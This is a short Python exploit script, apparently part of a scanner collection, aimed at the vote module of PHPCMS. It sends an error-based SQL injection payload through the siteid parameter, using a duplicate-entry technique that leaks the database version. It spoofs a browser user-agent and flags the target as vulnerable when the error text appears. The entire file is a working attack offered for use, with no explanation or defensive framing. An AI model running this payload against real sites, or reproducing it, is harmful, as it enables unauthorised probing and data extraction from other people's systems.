#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/index.php?m=vote&c=index&siteid=1'%20and%20(select%201%20from%20%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a);%23"
bug ="Duplicate entry"
info = "/phpcms/modules/vote/classes/vote_tag.class.php"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
